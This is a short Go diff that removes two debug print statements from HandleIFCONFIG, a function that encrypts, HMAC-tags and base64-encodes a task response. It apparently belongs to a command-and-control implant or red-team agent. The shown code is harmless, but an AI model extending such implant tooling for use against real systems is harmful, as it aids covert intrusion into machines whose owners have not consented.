@@ -20,7 +20,6 @@ func HandleIFCONFIG(ctx *CommandContext, tid [8]byte) string {
 		dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
 		ctx.Encrypt.HMACPackAddHmac(&dataEnc)
 		taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
-		println(taskRestEnc)
 		return taskRestEnc
 	}
 
@@ -110,7 +109,6 @@ func HandleIFCONFIG(ctx *CommandContext, tid [8]byte) string {
 	dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
 	ctx.Encrypt.HMACPackAddHmac(&dataEnc)
 	taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
-	println(taskRestEnc)
 	return taskRestEnc
 }
 
